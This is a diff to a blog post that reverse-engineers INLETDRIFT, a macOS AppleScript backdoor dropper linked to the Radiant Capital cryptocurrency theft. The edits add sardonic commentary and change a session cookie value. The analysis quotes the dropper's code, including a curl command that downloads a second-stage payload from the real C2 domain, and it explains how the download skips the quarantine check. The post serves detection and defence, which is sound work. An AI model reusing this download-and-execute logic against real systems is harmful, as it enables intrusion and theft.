@@ -19,11 +19,11 @@ permalink: /blog/inletdrift/
 
 ## Introduction
 
-This analysis documents the reverse engineering of INLETDRIFT, a macOS backdoor used in the October 2024 Radiant Capital incident. A Sophisticated attack that resulted in the theft of approximately $50 million USD in cryptocurrency. The malware is attributed to **UNC4736** (also known as AppleJeus or Citrine Sleet), a threat actor aligned with North Korea's Reconnaissance General Bureau (RGB).
+This analysis documents the reverse engineering of INLETDRIFT, a macOS backdoor used in the October 2024 Radiant Capital incident. A sophisticated attack that resulted in the theft of approximately $50 million USD in cryptocurrency. The malware is attributed to **UNC4736** (also known as AppleJeus or Citrine Sleet), a threat actor aligned with North Korea's Reconnaissance General Bureau (RGB).
 
 INLETDRIFT employs Living-off-the-Land (LotL) techniques, leveraging native macOS components like AppleScript and the <span class="glossary-term">osascript</span> interpreter to download and execute second-stage payloads while evading detection.
 
-The sample analyzed (`Amber_OTC_RECEIPT.app`) is disguised as a financial document but is actually a compiled AppleScript application bundle containing the dropper. A related sample (`Penpie_Hacking_Analysis_Report.app`) was used in the actual Radiant Capital attack.
+The sample analyzed (`Amber_OTC_RECEIPT.app`) is disguised as a financial document but is actually a compiled AppleScript application bundle containing the dropper. A related sample (`Penpie_Hacking_Analysis_Report.app`) was used in the actual Radiant Capital attack. Apple's automated security systems notarized this application, concluding it was safe to run.
 
 ![Amber_OTC_RECEIPT.app in Finder showing PDF-like icon disguise](./images/amber_finder_icon.png)
 *Figure 1: The malware disguised as a PDF document in Finder*
@@ -71,7 +71,7 @@ Amber_OTC_RECEIPT.app/
 │   ├── Info.plist              # Application metadata
 │   ├── PkgInfo                 # Package type identifier
 │   ├── MacOS/
-│   │   └── applet              # Universal <span class="glossary-term">Mach-O</span> executable (launcher)
+│   │   └── applet              # Universal Mach-O executable (launcher)
 │   ├── Resources/
 │   │   ├── Scripts/
 │   │   │   └── main.scpt       # MALICIOUS APPLESCRIPT PAYLOAD
@@ -102,13 +102,15 @@ Runtime Version=13.0.0
 
 > **The malware passed Apple's notarization process.** This means Apple's automated malware scanning did not detect the malicious payload at submission time. The notarization ticket is stapled to the application, allowing it to run without <span class="glossary-term">Gatekeeper</span> warnings on any Mac.
 
-The `runtime` flag (`flags=0x10000`) indicates the application was built with <span class="glossary-term">Hardened Runtime</span>, a requirement for notarization. This demonstrates the threat actor's sophistication in meeting Apple's security requirements.
+The malware passed Apple's notarization process, meaning somewhere in Apple's automated security pipeline, a machine looked at this backdoor and concluded: "Seems fine." The notarization ticket is stapled to the application, allowing it to run without Gatekeeper warnings on any Mac. This demonstrates the threat actor's sophistication in meeting Apple's security requirements, or alternatively, demonstrates that meeting Apple's security requirements is not particularly difficult.
+
+The `runtime` flag (`flags=0x10000`) indicates the application was built with <span class="glossary-term">Hardened Runtime</span>, a requirement for notarization.
 
 ---
 
 ### TCC Permission Requests
 
-The `Info.plist` reveals the malware's intent to request extensive system access through macOS's Transparency, Consent, and Control (<span class="glossary-term">TCC</span>) framework:
+The `Info.plist` reveals the malware's shopping list of system permissions it would like to have. The threat actor appears to have requested every permission available in macOS, suggesting either thorough operational planning or a "might as well ask" philosophy:
 
 | Permission | Usage Description | Threat Level |
 |------------|-------------------|--------------|
@@ -164,7 +166,7 @@ set theAppName to theBasename(POSIX path of (path to me as text))
 
 set theAppUpdateURL to "https://atokyonews.com/CloudCheck.php?type=Update"
 set theNewsDataURL to "https://atokyonews.com/CloudCheck.php?type=News"
-set theAtokyoSession to "session=28293447382828474738374"
+set theAtokyoSession to "session=20293447382028474738374"
 
 set theNewsData to theAtokyoPath & "/" & theAppName & ".pdf"
 set theAppUpdateData to theAtokyoPath & "/Update.tmp"
@@ -234,7 +236,7 @@ do shell script "mkdir " & theAtokyoPath
 #### 2. C2 Communication with Session Tracking
 
 ```applescript
-set theAtokyoSession to "session=28293447382828474738374"
+set theAtokyoSession to "session=20293447382028474738374"
 do shell script "curl " & quoted form of theAppUpdateURL & " --output " & theAppUpdateData & " --cookie " & theAtokyoSession
 ```
 
@@ -243,7 +245,7 @@ do shell script "curl " & quoted form of theAppUpdateURL & " --output " & theApp
 | C2 Domain | `atokyonews.com` |
 | Update Endpoint | `/CloudCheck.php?type=Update` |
 | News Endpoint | `/CloudCheck.php?type=News` |
-| Session Cookie | `session=28293447382828474738374` |
+| Session Cookie | `session=20293447382028474738374` |
 
 The hardcoded session cookie likely serves as:
 - **Victim tracking** - correlate downloads to specific campaigns
@@ -267,6 +269,8 @@ This is the critical **Living-off-the-Land** transformation. The downloaded `Upd
 | Cannot run | Can be executed |
 
 > **Quarantine Bypass**: Files downloaded via `curl` in a script do NOT receive the `com.apple.quarantine` extended attribute. This allows the backdoor to execute without <span class="glossary-term">Gatekeeper</span> intervention, even on systems with strict security settings.
+
+The malware thus sidesteps Gatekeeper entirely by simply not participating in the system that was designed to stop it. It is easier to move a problem around than it is to solve it.
 
 ---
 
@@ -309,7 +313,7 @@ on error errorMessage number errorNumber
 end try
 ```
 
-If any step fails, the malware displays a benign error dialog suggesting a generic "news" issue. This:
+If any step fails (network unreachable, server down, curl crashes), the malware displays a benign error dialog suggesting a generic "news" issue. This error message does not explain what went wrong, which is appropriate since the user did not ask for any of this to happen in the first place. This approach:
 - Provides plausible deniability
 - Prevents suspicion from error messages
 - Matches the fake "news" theme
@@ -401,7 +405,7 @@ $ curl -v -k 'https://atokyonews.com/CloudCheck.php?type=Update' \
 | **Hosting** | cPanel shared hosting |
 
 
-**Certificate Mismatch**: The SSL certificate's Common Name (`web-hosting.com`) does not match the domain (`atokyonews.com`). This indicates the threat actors are using **shared/bulletproof hosting** where multiple domains share a single wildcard or default certificate.
+**Certificate Mismatch**: The SSL certificate's Common Name (`web-hosting.com`) does not match the domain (`atokyonews.com`). This indicates the threat actors are using **shared/bulletproof hosting** where multiple domains share a single wildcard or default certificate. The server presents credentials for an entirely different website while serving malware, which is either sophisticated operational security or simply what happens when you rent hosting from providers who ask few questions. Both explanations are plausible.
 
 ---
 
@@ -416,7 +420,7 @@ The payload endpoint returns HTTP 404, indicating the backdoor binary has been r
 < x-turbo-charged-by: LiteSpeed
 ```
 
-The server returns a cPanel-branded 404 page, confirming the infrastructure runs on commodity shared hosting. The payload was likely rotated or removed after the campaign concluded or was detected.
+The server returns a cPanel-branded 404 page, confirming the infrastructure runs on commodity shared hosting. The C2 server is gone, but it left behind the web server equivalent of a business card. One could argue this demonstrates poor operational security. One could also argue that successfully stealing $50 million in cryptocurrency suggests their operational security was adequate.
 
 ![C2 server returning 404 response](./images/c2_404_response.png)
 *Figure 3: The C2 endpoint returning HTTP 404, indicating the payload has been removed*
@@ -438,6 +442,24 @@ osascript
 ```
 
 Each <span class="glossary-term">do shell script</span> command in AppleScript spawns a new `/bin/sh` child process, which then executes the target command. This creates a distinctive process tree pattern useful for behavioral detection.
+
+---
+
+## On the Nature of Living-off-the-Land
+
+The entire infection chain uses only binaries shipped with macOS:
+
+- `/usr/bin/osascript` (Apple's AppleScript interpreter)
+- `/bin/sh` (Bourne shell)
+- `/usr/bin/curl` (URL transfer utility)
+- `/bin/chmod` (permission modifier)
+- `/usr/bin/open` (Launch Services invoker)
+
+No custom malware binary is written to disk until after the system has been convinced to download and execute it. The dropper contains no shellcode, no exploits, no binary payloads. Only has instructions for combining legitimate tools in illegitimate ways.
+
+This is conceptually similar to building a bomb using only items available after airport security. The components are not themselves dangerous, but the assembly is.
+
+---
 
 ## Indicators of Compromise (IOCs)
 
@@ -531,10 +553,23 @@ rule INLETDRIFT_AppleScript_Dropper {
 
 ---
 
+## Concluding Observations
+
+This sample demonstrates several fundamental truths about macOS security:
+
+- **Code signing prevents modification but does not prevent malice.**
+- **Notarization indicates Apple reviewed the binary but not that Apple understood its intent.**
+- **Living-off-the-Land techniques work because the land is very well equipped.**
+- **A $50 million heist can be executed with 47 lines of AppleScript and a rented web server.**
+
+The sophistication here is not technical. The malware uses no exploits, no zero-days, no novel evasion techniques. The sophistication is operational: understanding which security boundaries matter (none of them, apparently) and which can be safely ignored (most of them).
+
+---
+
 ## References
 
 1. **Radiant Capital Incident Update**  
-   Radiant Capital DAO (December 2024)  
+   Radiant Capital DAO (December 6, 2024)  
    [https://medium.com/@RadiantCapital/radiant-capital-incident-update-e56d8c23829e](https://medium.com/@RadiantCapital/radiant-capital-incident-update-e56d8c23829e)
 2. **North Korean hackers behind $50 million crypto heist of Radiant Capital**  
    Recorded Future News (December 11, 2024)  
